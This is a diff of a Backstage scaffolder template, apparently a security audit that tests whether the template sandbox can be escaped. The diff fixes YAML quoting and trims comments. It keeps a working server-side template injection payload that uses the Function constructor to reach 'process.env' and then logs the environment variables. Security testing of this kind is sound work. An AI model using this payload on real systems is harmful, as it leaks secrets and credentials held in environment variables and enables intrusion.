@@ -2,8 +2,9 @@ apiVersion: scaffolder.backstage.io/v1beta3
 kind: Template
 metadata:
   name: ssti-sandbox-escape-test
-  title: Security Audit: Sandbox Escape
-  description: Testing if the isolated-vm sandbox can be bypassed to leak environment variables.
+  # FIXED: Wrapped in quotes because of the colon
+  title: "Security Audit: Sandbox Escape"
+  description: "Testing if the isolated-vm sandbox can be bypassed."
 spec:
   type: service
   owner: security-audit
@@ -22,12 +23,10 @@ spec:
       input:
         url: ./skeleton
         values:
-          # THIS IS THE EXPLOIT PAYLOAD
-          # It uses the constructor of a Range to access the 'process' object.
+          # Payload to test for sandbox escape
           leak: "{{ [].constructor.constructor('return process.env')() | dump }}"
 
     - id: log-result
       action: debug:log
       input:
-        # This will print the result directly to your PowerShell terminal
         message: "Audit Result: {{ values.leak }}"
